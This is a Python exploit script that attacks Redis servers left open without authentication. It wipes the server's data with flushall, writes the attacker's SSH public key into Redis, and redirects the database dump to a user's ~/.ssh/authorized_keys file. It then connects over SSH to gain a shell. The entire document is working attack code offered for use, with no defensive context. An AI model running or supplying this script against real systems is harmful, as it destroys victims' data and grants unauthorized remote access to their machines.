#!/usr/bin/python
#Author : Avinash Kumar Thapa aka -Acid / fixed for simple exploitation by n3bojs4
#Twitter : https://twitter.com/m_avinash143
#####################################################################################################################################################

import os
import os.path
from sys import argv



script, ip_address, username = argv


PATH='/usr/bin/redis-cli'
PATH1='/usr/local/bin/redis-cli'

def ssh_connection():
	shell = "ssh -i " + '$HOME/.ssh/id_rsa ' + username+"@"+ip_address
	os.system(shell)

if os.path.isfile(PATH) or os.path.isfile(PATH1):
	try:
    		print ('\t*******************************************************************')
    		print ('\t* [+] [Exploit] Exploiting misconfigured REDIS SERVER*')
    		print ('\t* [+] AVINASH KUMAR THAPA aka "-Acid"                                ')
		print ('\t*******************************************************************')
		print "\n"
		print ("\t SSH Keys Need to be Generated")
		os.system('ssh-keygen -t rsa -C \"acid_creative\"')
		print ("\t Keys Generated Successfully")
		os.system("(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') > $HOME/.ssh/public_key.txt")
		cmd = "redis-cli -h " + ip_address + ' flushall'
		cmd1 = "redis-cli -h " + ip_address
		os.system(cmd)
		cmd2 = "cat $HOME/.ssh/public_key.txt | redis-cli -h " +  ip_address + ' -x set cracklist'
		os.system(cmd2)
		cmd3 = cmd1 + ' config set dbfilename "backup.db" '
		cmd4 = cmd1 + ' config set  dir' + " /home/"+username+"/.ssh/"
		cmd5 = cmd1 + ' config set dbfilename "authorized_keys" '
		cmd6 = cmd1 + ' save'
		os.system(cmd3)
		os.system(cmd4)
		os.system(cmd5)
		os.system(cmd6)
		print ("\tYou'll get shell in sometime..Thanks for your patience")
		ssh_connection()

	except:
		print "Something went wrong"
else:
	print ("\tRedis-cli:::::This utility is not present on your system. You need to install it to proceed further.")
